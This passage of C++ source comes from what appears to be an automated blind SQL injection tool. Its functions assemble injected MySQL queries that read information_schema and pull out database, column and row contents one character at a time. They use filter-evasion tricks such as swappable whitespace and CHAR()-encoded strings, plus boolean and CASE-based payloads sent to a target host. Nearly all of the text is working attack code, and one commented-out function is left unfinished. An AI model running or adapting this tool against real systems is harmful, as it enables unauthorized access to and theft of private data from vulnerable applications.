	this->log(2, _T("[*] Bruteforcing column name length for column id %d in table '%s' in database '%s'"), id, tablename, dbname);
	size_t len = 1024+_tcslen(this->space)+1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	_stprintf_s(qry, len, _T("SELECT%sLENGTH(COLUMN_NAME)%sFROM%sinformation_schema.COLUMNS%sWHERE%sTABLE_SCHEMA=CONCAT("), this->space, this->space, this->space, this->space, this->space);
	for (unsigned int i=0; i<_tcslen(dbname); i++)
	{
		if (i) _stprintf_s(qry, len, _T("%s,"), qry);
		_stprintf_s(qry, len, _T("%sCHAR(%d)"), qry, dbname[i]);
	}
	_stprintf_s(qry, len, _T("%s)%sAND%sTABLE_NAME=CONCAT("), qry, this->space, this->space);
	for (unsigned int i=0; i<_tcslen(tablename); i++)
	{
		if (i) _stprintf_s(qry, len, _T("%s,"), qry);
		_stprintf_s(qry, len, _T("%sCHAR(%d)"), qry, tablename[i]);
	}
	_stprintf_s(qry, len, _T("%s)%sLIMIT%s%d,1"), qry, this->space, this->space, id-1);
	TCHAR result = this->get_result(qry);
	delete[] qry;
	return result;
}

TCHAR* CFramework::getColumnName(TCHAR* dbname, TCHAR* tablename, unsigned long id, unsigned long length)
{
	if (!length) return 0;
	if (this->history.getColumn(this->host, dbname, tablename, id)) return this->history.getColumn(this->host, dbname, tablename, id)->name;
	TCHAR* columnname = new TCHAR[length+1];
	memset(columnname, 0, (length+1)*sizeof(TCHAR));
	this->log(2, _T("[*] Bruteforcing column name for column index %d with length %d in table '%s' in database '%s'"), id, length, tablename, dbname);
	size_t len = 1024+_tcslen(this->space)+1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	for (unsigned long i=1; i<=length; i++)
	{
		this->log(3, _T("[*] Getting column name character at index %d of length %d for column id %d"), i, length, id);
		_stprintf_s(qry, len, _T("SELECT%ssubstr((SELECT%sCOLUMN_NAME%sFROM%sinformation_schema.COLUMNS%sWHERE%sTABLE_SCHEMA=CONCAT("), this->space, this->space, this->space, this->space, this->space, this->space);
		for (unsigned int a=0; a<_tcslen(dbname); a++)
		{
			if (a) _stprintf_s(qry, len, _T("%s,"), qry);
			_stprintf_s(qry, len, _T("%sCHAR(%d)"), qry, dbname[a]);
		}
		_stprintf_s(qry, len, _T("%s)%sAND%sTABLE_NAME=CONCAT("), qry, this->space, this->space);
		for (unsigned int b=0; b<_tcslen(tablename); b++)
		{
			if (b) _stprintf_s(qry, len, _T("%s,"), qry);
			_stprintf_s(qry, len, _T("%sCHAR(%d)"), qry, tablename[b]);
		}
		_stprintf_s(qry, len, _T("%s)%sLIMIT%s%d,1),%d,1)"), qry, this->space, this->space, id-1, i);
		TCHAR result = this->get_result(qry, true);
		if (result != RESULT_NOT_FOUND)
		{
			this->log(2, _T("[+] Found column name character %c for index %d of length %d"), result, i, length);
			columnname[i-1] = result;
		}
		else
		{
			this->log(2, _T("[-] Column name character for index %d of length %d not found"), i, length);
			columnname[i-1] = _T('?');
		}
	}
	delete[] qry;
	COLUMN* c = this->history.addColumn(this->host, dbname, tablename, columnname);
	delete[] columnname;
	if (!c) return 0;
	c->index = id;
	return c->name;
}

unsigned long CFramework::getRowCount(TCHAR* dbname, TCHAR* tablename)
{
	TABLE* table = this->history.addTable(this->host, dbname, tablename);
	if (table->rowcount && (table->rowcount != RESULT_NOT_FOUND)) return table->rowcount;
	this->log(2, _T("[*] Bruteforcing amount of rows in table '%s' in database '%s'"), tablename, dbname);
	size_t len = 1024+_tcslen(this->space)+1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	_stprintf_s(qry, len, _T("SELECT%sLENGTH(COUNT(0))%sFROM%s%s.%s"), this->space, this->space, this->space, dbname, tablename);
	TCHAR length = this->get_result(qry);
	if (length == RESULT_NOT_FOUND)
	{
		delete[] qry;
		return RESULT_NOT_FOUND;
	}
	TCHAR* data = new TCHAR[length+1];
	memset(data, 0, (length+1)*sizeof(TCHAR));
	for (unsigned long i=1; i<=length; i++)
	{
		this->log(3, _T("[*] Getting row count character at index %d of length %d"), i, length);
		_stprintf_s(qry, len, _T("SELECT%ssubstr((SELECT%sCOUNT(0)%sFROM%s%s.%s),%d,1)"), this->space, this->space, this->space, this->space, dbname, tablename, i);
		TCHAR result = this->get_result(qry, true);
		if (result != RESULT_NOT_FOUND)
		{
			this->log(2, _T("[+] Found row count character %c for index %d of length %d"), result, i, length);
			data[i-1] = result;
		}
		else
		{
			this->log(2, _T("[-] Row count character for index %d of length %d not found"), i, length);
			data[i-1] = _T('?');
		}
	}
	delete[] qry;
	table->rowcount = _ttoi(data);
	delete[] data;
	return table->rowcount;
}

unsigned long CFramework::getRowDataLength(TCHAR* dbname, TCHAR* tablename, TCHAR* columnname, unsigned long row)
{
	if (this->history.getRow(this->host, dbname, tablename, columnname, row)) return _tcslen(this->history.getRow(this->host, dbname, tablename, columnname, row)->data);
	this->log(2, _T("[*] Bruteforcing row data length for row id %d in column '%s' in table '%s' in database '%s'"), row, columnname, tablename, dbname);
	size_t len = 1024+_tcslen(this->space)+1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	_stprintf_s(qry, len, _T("SELECT%sLENGTH(%s)%sFROM%s%s.%s%sLIMIT%s%d,1"), this->space, columnname, this->space, this->space, dbname, tablename, this->space, this->space, row-1);
	TCHAR result = this->get_result(qry);
	delete[] qry;
	return result;
}

TCHAR* CFramework::getRowData(TCHAR* dbname, TCHAR* tablename, TCHAR* columnname, unsigned long row, unsigned long length)
{
	if (this->history.getRow(this->host, dbname, tablename, columnname, row)) return this->history.getRow(this->host, dbname, tablename, columnname, row)->data;
	TCHAR* data = new TCHAR[length+1];
	memset(data, 0, (length+1)*sizeof(TCHAR));
	this->log(2, _T("[*] Bruteforcing row data for row %d with data length %d in column '%s' in table '%s' in database '%s'"), row, length, columnname, tablename, dbname);
	size_t len = 1024+_tcslen(this->space)+1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	for (unsigned long i=1; i<=length; i++)
	{
		this->log(3, _T("[*] Getting row data character at index %d of length %d for row id %d"), i, length, row);
		_stprintf_s(qry, len, _T("SELECT%ssubstr((SELECT%s%s%sFROM%s%s.%s%sLIMIT%s%d,1),%d,1)"), this->space, this->space, columnname, this->space, this->space, dbname, tablename, this->space, this->space, row-1, i);
		TCHAR result = this->get_result(qry, true);
		if (result != RESULT_NOT_FOUND)
		{
			this->log(2, _T("[+] Found row data character %c for index %d of length %d"), result, i, length);
			data[i-1] = result;
		}
		else
		{
			this->log(2, _T("[-] Row data character for index %d of length %d not found"), i, length);
			data[i-1] = _T('?');
		}
	}
	delete[] qry;
	ROW* r = this->history.addRow(this->host, dbname, tablename, columnname, data);
	delete[] data;
	if (!r) return 0;
	r->index = row;
	return r->data;
}

TCHAR* CFramework::getCustomData(TCHAR* dbname, TCHAR* tablename, TCHAR* columnname, TCHAR* target, TCHAR* criteria)
{
	this->log(2, _T("[*] Bruteforcing data for column '%s' in table '%s' in database '%s'"), columnname, tablename, dbname);
	size_t len = 1024+_tcslen(this->space)+1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	TCHAR* encoded = new TCHAR[len];
	memset(encoded, 0, len*sizeof(TCHAR));
	_stprintf_s(encoded, len, _T("CONCAT("));
	for (unsigned int a=0; a<_tcslen(criteria); a++)
	{
		if (a) _stprintf_s(encoded, len, _T("%s,"), encoded);
		_stprintf_s(encoded, len, _T("%sCHAR(%d)"), encoded, criteria[a]);
	}
	_stprintf_s(qry, len, _T("SELECT%sCOUNT(0)%sFROM%s%s.%s%sWHERE%s%s%sLIKE%s%s)"), this->space, this->space, this->space, dbname, tablename, this->space, this->space, target, this->space, this->space, encoded);
	unsigned long rows = this->get_result(qry);
	if (rows == RESULT_NOT_FOUND)
	{
		delete[] qry;
		delete[] encoded;
		this->log(0, _T("[-] No result(s) found for criteria"));
		return 0;
	}
	unsigned long id = 1;
	if (rows > 1)
	{
		TCHAR tmp[1024] = {0};
		while (true)
		{
			_tprintf(_T("Found %d rows - select row number: "), rows);
			_fgetts(tmp, sizeof(tmp), stdin);
			id = _ttoi(tmp);
			if ((id > rows) || (id < 1))
				_tprintf(_T("Invalid row number - select between 1 and %d"), rows);
			else
				break;
		}
	}
	_stprintf_s(qry, len, _T("SELECT%sLENGTH(%s)%sFROM%s%s.%s%sWHERE%s%s%sLIKE%s%s)%sLIMIT%s%d,1"), 
		this->space, columnname, this->space, this->space, dbname, tablename, this->space, this->space, target, this->space, this->space, encoded, this->space, this->space, id-1);
	TCHAR length = this->get_result(qry);
	if (length == RESULT_NOT_FOUND)
	{
		delete[] qry;
		delete[] encoded;
		return 0;
	}
	this->log(0, _T("[+] Custom data length: %d"), length);
	TCHAR* data = new TCHAR[length+1];
	memset(data, 0, (length+1)*sizeof(TCHAR));
	for (unsigned long i=1; i<=length; i++)
	{
		this->log(3, _T("[*] Getting data character at index %d of length %d"), i, length);
		_stprintf_s(qry, len, _T("SELECT%ssubstr((SELECT%s%s%sFROM%s%s.%s%sWHERE%s%s%sLIKE%s%s)%sLIMIT%s%d,1),%d,1)"), 
			this->space, this->space, columnname, this->space, this->space, dbname, tablename, this->space, this->space, target, this->space, this->space, encoded, this->space, this->space, id-1, i);
		TCHAR result = this->get_result(qry, true);
		if (result != RESULT_NOT_FOUND)
		{
			this->log(2, _T("[+] Found data character %c for index %d of length %d"), result, i, length);
			data[i-1] = result;
		}
		else
		{
			this->log(2, _T("[-] Data character for index %d of length %d not found"), i, length);
			data[i-1] = _T('?');
		}
	}
	delete[] qry;
	delete[] encoded;
	ROW* r = this->history.addRow(this->host, dbname, tablename, columnname, data);
	delete[] data;
	if (!r) return 0;
	return r->data;
}

//unsigned long CFramework::getCustomQueryRowCount(TCHAR* query)
//{
//	this->log(2, _T("[*] Bruteforcing amount of rows for query '%s'"), query);
//	size_t len = 1024+_tcslen(this->space)+1;
//	TCHAR* qry = new TCHAR[len];
//	memset(qry, 0, len*sizeof(TCHAR));
//	_stprintf_s(qry, len, _T("SELECT%sLENGTH(COUNT(0))%sFROM%s(%s)%sAS%s_"), this->space, this->space, this->space, query, this->space, this->space);
//	TCHAR length = this->get_result(qry);
//	if (length == RESULT_NOT_FOUND)
//	{
//		delete[] qry;
//		return RESULT_NOT_FOUND;
//	}
//	TCHAR* data = new TCHAR[length+1];
//	memset(data, 0, (length+1)*sizeof(TCHAR));
//	for (unsigned long i=1; i<=length; i++)
//	{
//		this->log(3, _T("[*] Getting row count character at index %d of length %d"), i, length);
//		"SELECT RIGHT( LEFT( (SELECT COUNT(0) FROM (%s)
//		_stprintf_s(qry, len, _T("SELECT%sleft((SELECT%sCOUNT(0)%sFROM%s%s.%s),%d)"), this->space, this->space, this->space, this->space, dbname, tablename, i);
//		TCHAR result = this->get_result(qry, true);
//		if (result != RESULT_NOT_FOUND)
//		{
//			this->log(2, _T("[+] Found row count character %c for index %d of length %d"), result, i, length);
//			data[i-1] = result;
//		}
//		else
//		{
//			this->log(2, _T("[-] Row count character for index %d of length %d not found"), i, length);
//			data[i-1] = _T('?');
//		}
//	}
//	delete[] qry;
//	table->rowcount = _ttoi(data);
//	delete[] data;
//	return table->rowcount;
//}

bool CFramework::checkExistence(TCHAR* dbname, TCHAR* tablename, TCHAR* columnname, unsigned long row, TCHAR* criteria)
{
	size_t len = 1024+_tcslen(this->space)+1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	//_stprintf_s(qry, len, 
	delete[] qry;
	return true;
}

bool CFramework::checkExistence(TCHAR* query)
{
	if (!query) return false;
	size_t len = 1024+_tcslen(query)+1;
	TCHAR* qry = new TCHAR[len];
	memset(qry, 0, len*sizeof(TCHAR));
	if ((this->method == METHOD_BRUTEFORCE_SMART) || (this->method == METHOD_BRUTEFORCE))
		_stprintf_s(qry, len, _T("%sAND%s(SELECT(%s)%sis%snot%snull)%s"), this->space, this->space, query, this->space, this->space, this->space, this->end);
	else if (this->method == METHOD_CACHING)
		_stprintf_s(qry, len, _T("(SELECT%sCASE%s(SELECT(%s)%sis%snot%snull)%sWHEN%s0%sTHEN%s%d%sWHEN%s1%sTHEN%s%d%sEND)"), 
		this->space, this->space, query, this->space, this->space, this->space, this->space, this->space, this->space, this->space, this->cache_list[0]->page, this->space, this->space, this->space, this->space, this->cache_list[1]->page, this->space);
	//else
	//?
	int ret = this->query_send(qry);
	delete[] qry;
	return ret;
}